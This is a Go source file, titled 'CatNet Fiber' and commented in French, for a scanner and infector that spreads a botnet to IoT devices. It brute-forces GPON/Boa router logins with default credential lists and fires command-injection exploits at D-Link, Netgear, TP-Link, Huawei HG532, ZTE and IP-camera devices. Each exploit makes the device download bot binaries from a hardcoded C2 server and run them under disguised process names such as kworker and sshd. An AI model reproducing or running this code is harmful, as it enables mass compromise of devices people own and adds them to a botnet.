/*
CatNet Fiber - Scanner et infecteur optimisé
Version 2.0
*/

package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Statistiques et synchronisation
var (
    syncWait sync.WaitGroup
    statusLogins, statusAttempted, statusFound, statusInfected int
    mutex = &sync.Mutex{}
    ctx, cancel = context.WithCancel(context.Background())
    startTime = time.Now()
)

// Configuration du serveur C2
var (
    c2ServerIP = "51.68.128.169"
    c2ServerPort = "1337"
    c2Server = c2ServerIP + ":" + c2ServerPort
    c2HttpServer = "http://" + c2ServerIP
    c2HttpsServer = "https://" + c2ServerIP
)

// Gestion des connexions concurrentes
var (
    // Sémaphore pour limiter les connexions concurrentes
    sem = make(chan struct{}, 2000) // Augmenté à 2000 connexions concurrentes
    // Canal pour les résultats d'infection
    resultChan = make(chan string, 100)
    // Canal pour les cibles vulnérables
    vulnerableChan = make(chan string, 500)
)

// Données d'authentification pour les appareils
var (
    // Combinaisons login:mot de passe courantes
    loginsString = []string{
        "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", 
        "guest:guest", "support:support", "user:user", "admin:password", "default:default", 
        "admin:password123", "root:root", "root:admin", "root:password", "root:1234", 
        "admin:admin123", "admin:12345", "admin:54321", "admin:pass", "admin:adminadmin",
        "admin:", "root:", "supervisor:supervisor", "ubnt:ubnt", "service:service",
        "guest:12345", "admin:4321", "admin:1111", "admin:666666", "admin:1234567890",
        "admin:888888", "admin:54321", "admin:00000000", "admin:9999",
    }
    
    // Combinaisons spécifiques par fabricant
    vendorLogins = map[string][]string{
        "mikrotik": {"admin:", "admin:admin", "admin:password"},
        "huawei":   {"admin:admin", "telecomadmin:admintelecom", "root:admin"},
        "zte":      {"admin:admin", "root:Zte521", "root:root"},
        "cisco":    {"admin:admin", "cisco:cisco", "enable:system"},
        "dlink":    {"admin:admin", "admin:", "admin:password"},
        "juniper":  {"admin:admin123", "root:juniper123", "super:juniper123"},
        "netgear":  {"admin:password", "admin:admin", "admin:1234"},
        "tplink":   {"admin:admin", "admin:password", "root:root"},
        "ubiquiti": {"ubnt:ubnt", "admin:admin", "admin:ubnt"},
        "asus":     {"admin:admin", "admin:password", "root:root"},
        "linksys":  {"admin:admin", "admin:password", "root:root"},
        "hikvision":{"admin:12345", "admin:admin", "root:pass"},
        "dahua":    {"admin:admin", "888888:888888", "666666:666666"},
    }
    
    // Ports courants à scanner
    commonPorts = []string{"80", "81", "82", "83", "84", "88", "8080", "8081", "8082", "8083", "8084", "8088", "8888", "9000"}
)

// Structure pour les malwares disponibles
type Malware struct {
    name     string
    path     string
    arch     string
    args     string
    priority int
}

// Structure pour les vulnérabilités
type Vulnerability struct {
    name        string
    description string
    check       func(string) bool
    exploit     func(string, string, string, string) bool
}

// Structure pour les méthodes de téléchargement
type DownloadMethod struct {
    name    string
    command string
}

// Liste des malwares disponibles
var malwares = []Malware{
    {"bot", "/bot.mips", "mips", "mips", 1},
    {"bot", "/bot.arm", "arm", "arm", 2},
    {"bot", "/bot.arm7", "arm7", "arm7", 3},
    {"bot", "/bot.x86", "x86", "x86", 4},
    {"bot", "/bot.x86_64", "x86_64", "x86_64", 5},
    {"bot", "/bot.sh4", "sh4", "sh4", 6},
    {"bot", "/bot.m68k", "m68k", "m68k", 7},
    {"bot", "/bot.ppc", "ppc", "ppc", 8},
    {"bot", "/bot.sparc", "sparc", "sparc", 9},
}

// Noms pour camoufler le malware
var hideNames = []string{
    "sysupdate",
    "systemd-worker",
    "kworker",
    "crond",
    "udevd",
    "ntpd",
    "sshd",
    "dropbear",
    "telnetd",
    "systemd",
    "network-manager",
    "dnsmasq",
    "cron-apt",
    "syslogd",
    "logrotate",
    "crontab",
    "watchdog",
}

// Chemins d'installation
var installPaths = []string{
    "/tmp",
    "/var/tmp",
    "/dev",
    "/var/run",
    "/var/lock",
    "/bin",
    "/usr/bin",
    "/usr/local/bin",
    "/opt",
    "/var",
    "/mnt",
    "/lib",
    "/etc",
}

// Méthodes de téléchargement
var downloadMethods = []DownloadMethod{
    {"wget", "wget http://%s%s -O %s/.%s"},
    {"curl", "curl -s http://%s%s -o %s/.%s"},
    {"busybox wget", "busybox wget http://%s%s -O %s/.%s"},
    {"tftp", "tftp -g -r %s %s -l %s/.%s"},
    {"ftpget", "ftpget %s %s/.%s %s"},
    {"busybox ftpget", "busybox ftpget %s %s/.%s %s"},
}

// Utilitaires

// Effacer les données d'un tableau d'octets
func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

// Générer un nom de fichier aléatoire
func randomFileName() string {
    const chars = "abcdefghijklmnopqrstuvwxyz"
    result := make([]byte, 8)
    for i := range result {
        result[i] = chars[rand.Intn(len(chars))]
    }
    return string(result)
}

// Créer un client HTTP avec timeout
func createHTTPClient() *http.Client {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        IdleConnTimeout: 30 * time.Second,
    }
    return &http.Client{
        Transport: tr,
        Timeout:   time.Second * 10,
    }
}

// Vérifier si un port est ouvert
func isPortOpen(target string, timeout time.Duration) bool {
    conn, err := net.DialTimeout("tcp", target, timeout)
    if err != nil {
        return false
    }
    conn.Close()
    return true
}

// Fonctions d'exploitation

// Exploiter la vulnérabilité RCE dans les routeurs D-Link
func exploitDlinkRCE(target string, c2Server string, hideName string, malwarePath string) bool {
	// Vulnérabilité d'exécution de commande dans les routeurs D-Link
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Construire la commande d'exploitation avec plusieurs méthodes de téléchargement
	exploitCmd := fmt.Sprintf("command=cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("POST /apply.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		target, len(exploitCmd), exploitCmd)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(httpRequest))
	
	// Essayer aussi la vulnérabilité alternative
	exploitCmd2 := fmt.Sprintf("username=admin&password=admin&login=&ping_addr=127.0.0.1; cd /tmp && rm -rf .%s && wget http://%s%s -O .%s && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	httpRequest2 := fmt.Sprintf("POST /ping.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		target, len(exploitCmd2), exploitCmd2)

	conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err == nil {
		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn2.Write([]byte(httpRequest2))
		conn2.Close()
	}
	
	return true
}

// Exploiter la vulnérabilité dans les routeurs Netgear
func exploitNetgearRCE(target string, c2Server string, hideName string, malwarePath string) bool {
	// Vulnérabilité d'exécution de commande dans les routeurs Netgear
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Construire la commande d'exploitation avec plusieurs méthodes de téléchargement
	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=%s&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nConnection: close\r\n\r\n",
		exploitCmd, target)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(httpRequest))
	
	// Essayer aussi la vulnérabilité alternative
	conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err == nil {
		defer conn2.Close()
		
		// Vulnérabilité dans le firmware plus récent
		exploitCmd2 := fmt.Sprintf("cd /tmp && rm -rf .%s && wget http://%s%s -O .%s && chmod 777 .%s && ./.%s mips &", 
			hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
		
		httpRequest2 := fmt.Sprintf("GET /cgi-bin/;%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
			exploitCmd2, target)
		
		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn2.Write([]byte(httpRequest2))
	}
	
	return true
}

// Exploiter la vulnérabilité dans les caméras IP
func exploitIPCameraRCE(target string, c2Server string, hideName string, malwarePath string) bool {
	// Vulnérabilité d'exécution de commande dans les caméras IP
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Construire la commande d'exploitation avec plusieurs méthodes de téléchargement
	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("GET /system.ini?loginuse&loginpas&%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nConnection: close\r\n\r\n",
		exploitCmd, target)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(httpRequest))
	
	// Essayer aussi la vulnérabilité alternative pour les caméras Hikvision
	conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err == nil {
		defer conn2.Close()
		
		exploitCmd2 := fmt.Sprintf("cd /tmp && rm -rf .%s && wget http://%s%s -O .%s && chmod 777 .%s && ./.%s mips &", 
			hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
		
		httpRequest2 := fmt.Sprintf("GET /command.php?cmd=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
			exploitCmd2, target)
		
		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn2.Write([]byte(httpRequest2))
	}
	
	return true
}

// Exploiter la vulnérabilité dans les routeurs TP-Link
func exploitTPLinkRCE(target string, c2Server string, hideName string, malwarePath string) bool {
	// Vulnérabilité d'exécution de commande dans les routeurs TP-Link
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Construire la commande d'exploitation
	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("POST /cgi?2 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n[COMMANDS];%s;[/COMMANDS]",
		target, len(exploitCmd)+22, exploitCmd)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(httpRequest))
	return true
}

// Exploiter la vulnérabilité dans les routeurs Huawei HG532
func exploitHuaweiRCE(target string, c2Server string, hideName string, malwarePath string) bool {
	// Vulnérabilité d'exécution de commande dans les routeurs Huawei HG532
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Construire la commande d'exploitation
	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Payload pour la vulnérabilité CVE-2017-17215
	payload := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n<s:Body>\n<u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n<NewStatusURL>$(/bin/sh -c '%s')</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n</s:Body>\n</s:Envelope>", exploitCmd)
	
	// Envoyer la requête SOAP pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/xml\r\nContent-Length: %d\r\nSOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#Upgrade\r\nConnection: close\r\n\r\n%s",
		target, len(payload), payload)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(httpRequest))
	return true
}

// Exploiter la vulnérabilité dans les routeurs ZTE
func exploitZTERCE(target string, c2Server string, hideName string, malwarePath string) bool {
	// Vulnérabilité d'exécution de commande dans les routeurs ZTE
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Construire la commande d'exploitation
	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("POST /web_shell_cmd.gch HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\ncmd=%s",
		target, len(exploitCmd)+4, exploitCmd)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(httpRequest))
	return true
}

func sendExploit(target string) int {
	// Liste des différents malwares à tester (tous hébergés sur votre serveur C2)
	malwares := []struct {
		name string
		path string
		arch string
		args string // Arguments à passer au malware lors de l'exécution
		priority int // Priorité d'infection (plus le chiffre est bas, plus la priorité est élevée)
	}{
		{"bot", "/bot.mips", "mips", "mips", 1},         // Très courant dans les routeurs
		{"bot", "/bot.arm", "arm", "arm", 2},           // Courant dans les appareils IoT
		{"bot", "/bot.arm7", "arm7", "arm7", 3},       // Appareils ARM modernes
		{"bot", "/bot.x86", "x86", "x86", 4},           // Ordinateurs 32 bits
		{"bot", "/bot.x86_64", "x86_64", "x86_64", 5}, // Ordinateurs 64 bits
		{"bot", "/bot.sh4", "sh4", "sh4", 6},           // Appareils embarqués
		{"bot", "/bot.m68k", "m68k", "m68k", 7},       // Anciens systèmes
		{"bot", "/bot.ppc", "ppc", "ppc", 8},           // PowerPC
		{"bot", "/bot.sparc", "sparc", "sparc", 9},     // Serveurs SPARC
	}

	// Noms alternatifs pour camoufler le malware
	hideNames := []string{
		"sysupdate",
		"systemd-worker",
		"kworker",
		"crond",
		"udevd",
		"ntpd",
		"sshd",
		"dropbear",
		"telnetd",
	}

	// Utiliser les variables globales c2ServerIP, c2ServerPort et c2Server définies au niveau du package
	
	// Chemins d'installation alternatifs
	installPaths := []string{
		"/tmp",
		"/var/tmp",
		"/dev",
		"/var/run",
		"/var/lock",
		"/bin",
		"/usr/bin",
		"/usr/local/bin",
	}

	// Essayer chaque malware en fonction de sa priorité
	// Trier les malwares par priorité (les plus prioritaires d'abord)
	for _, malware := range malwares {
		// Sélectionner un nom aléatoire pour ce malware
		hideName := hideNames[rand.Intn(len(hideNames))]
		
		// Essayer plusieurs chemins d'installation
		for _, installPath := range installPaths {
			conn, err := net.DialTimeout("tcp", target, 10 * time.Second) // Réduit à 10 secondes pour accélérer
			if err != nil {
				break // Si on ne peut pas se connecter, passer au malware suivant
			}
			
			// Construire la commande d'exploitation avec wget et nom caché
			exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bwget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
				installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
			
			// Envoyer la requête pour notre serveur C2
			httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
				target, len(exploitCmd)+29, target, target, exploitCmd)

			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			conn.Write([]byte(httpRequest))
			conn.Close() // Fermer immédiatement pour accélérer
			
			// Essayer avec curl comme alternative à wget
			conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
			if err == nil {
				curlCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bcurl%%20http://%s%s%%20-o%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
					installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
				
				curlRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
					target, len(curlCmd)+29, target, target, curlCmd)

				conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
				conn2.Write([]byte(curlRequest))
				conn2.Close()
			}
			
			// Essayer avec busybox wget comme troisième option
			conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
			if err == nil {
				busyboxCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bbusybox%%20wget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
					installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
				
				busyboxRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
					target, len(busyboxCmd)+29, target, target, busyboxCmd)

				conn3.SetWriteDeadline(time.Now().Add(10 * time.Second))
				conn3.Write([]byte(busyboxRequest))
				conn3.Close()
			}
		}
		
		// Pause très courte entre les tentatives
		time.Sleep(100 * time.Millisecond)
	}

	// Exploiter d'autres vulnérabilités connues dans différents appareils
	// 1. Exploiter la vulnérabilité RCE dans les routeurs D-Link
	exploitDlinkRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
	
	// 2. Exploiter la vulnérabilité dans les routeurs Netgear
	exploitNetgearRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
	
	// 3. Exploiter la vulnérabilité dans les caméras IP
	exploitIPCameraRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
	
	// 4. Essayer aussi avec tftp comme méthode alternative de téléchargement
	for _, installPath := range installPaths[:3] { // Limiter aux 3 premiers chemins pour économiser du temps
		hideName := hideNames[rand.Intn(len(hideNames))]
		conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
		if err == nil {
			tftpCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Btftp%%20-g%%20-r%%20bot.mips%%20%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20mips%%20&", 
				installPath, hideName, c2ServerIP, installPath, hideName, installPath, hideName)
			tftpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
				target, len(tftpCmd)+29, target, target, tftpCmd)

			conn3.SetWriteDeadline(time.Now().Add(10 * time.Second))
			conn3.Write([]byte(tftpRequest))
			conn3.Close()
		}
	}
	
	// 5. Essayer avec une injection de commande dans le paramètre ping
	conn4, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err == nil {
		hideName := hideNames[rand.Intn(len(hideNames))]
		pingCmd := fmt.Sprintf("ping_addr=127.0.0.1;wget%%20http://%s/bot.mips%%20-O%%20/tmp/.%s;chmod%%20777%%20/tmp/.%s;/tmp/.%s%%20mips%%20&", 
			c2ServerIP, hideName, hideName, hideName)
		pingRequest := fmt.Sprintf("POST /boaform/admin/formPing HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_ping_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s\r\n\r\n",
			target, len(pingCmd), target, target, pingCmd)

		conn4.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn4.Write([]byte(pingRequest))
		conn4.Close()
	}

	return 1
}

func sendLogin(target string) int {

	var isLoggedIn int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, 30 * time.Second) // Réduit à 30 secondes
	    if err != nil {
			return -1
	    }

		cntLen = 14
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

	    conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes
	    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
		    return -1
		}

		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Moved Temporarily") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		// statusLogins est maintenant incrémenté dans processTarget
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return 1
	} else {
		return -1
	}
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=admin&psd=Feefifofum\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
		// Ne pas incrémenter statusFound ici, c'est fait dans processTarget
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {
	// Acquérir le sémaphore
	sem <- struct{}{}
	defer func() {
		// Libérer le sémaphore quand on a terminé
		<-sem
		syncWait.Done()
	}()

	// Vérifier si l'appareil est vulnérable
	if checkDevice(target, 10) == 1 {
		// Incrémenter le compteur de manière thread-safe
		mutex.Lock()
		statusFound++
		mutex.Unlock()
		
		// Tenter de se connecter et d'exploiter
		if sendLogin(target) == 1 {
			mutex.Lock()
			statusLogins++
			mutex.Unlock()
		}
		sendExploit(target)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./fiber [port]")
		os.Exit(1)
	}

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
        for {
            fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
            time.Sleep(1 * time.Second)
            i++
        }
    }()

    // Initialiser le sémaphore
    for i := 0; i < 1000; i++ {
        sem <- struct{}{}
        <-sem
    }

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            target := scan.Text()
            mutex.Lock()
            statusAttempted++
            mutex.Unlock()
            syncWait.Add(1)
            go processTarget(target + ":" + os.Args[1], target)
        }
    }
}
